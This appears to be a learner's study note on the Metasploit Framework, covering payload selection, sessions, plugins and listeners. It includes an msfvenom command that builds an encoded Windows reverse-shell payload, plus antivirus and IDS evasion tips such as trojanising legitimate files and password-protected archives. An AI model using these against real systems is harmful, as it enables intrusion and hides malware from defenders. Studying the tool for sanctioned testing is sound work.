# Metasploit Framework

We know the basics of msfconsole so I will just be going over the new concepts.

## Payloads

Once we select a module we can alos select a paylod. Msf will be default use the best one but you can chnage with set payload \<no>. Show payloads

## Encoding

Msfvenom can encode a payloads.

```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f perl -e x86/shikata_ga_nai
```

-a = Archecture to use

-f  = Format

-e = Encoder to use

-i = Iterations to encode

Can also encode within msfconsole

MSF - VirusTotal can be used to check if a payload will be recognised as a virus

## Database

Msfconsole can be used to store hosts, passwords, services in a databse. No writing this up as I have my own note taking methods and this db will be largely redundant for me.

## Plugins

Can use third party plugins in msf. load \<plugin>

[Here](https://github.com/darkoperator/Metasploit-Plugins) are some user ones a good one is pentest. Take a look and get familar with some of the more popular ones.

## Session

Can have multiple sessions at once and you can attach a payload to a session. For example if you have used a webexploit to gain shell access you can then attach a priv esc payload to that shell. Neat!

Use the set session \<no> command

## Adding modules

Add modules from serachsploit to /usr/share/metasploit-framework/modules/exploits

And use reload\_all to refresh cache

## Shells

Msf can create nc listeners for shells. Use multi/handler

Once connected can use local exploit suggester module for recon. Have to set session of course.

## Evasion techniques

Msfconsole can use AES encryption to bypass IDS/IPS

msfvenom -k -x flag can be used to inject the payload into a legitimate file and if we encode on top of that it becomes much harder to fingerprint.

Can also archive payloads as rars with a password to bypasss detection but this will be flagged and potentially manually checked by an admin.
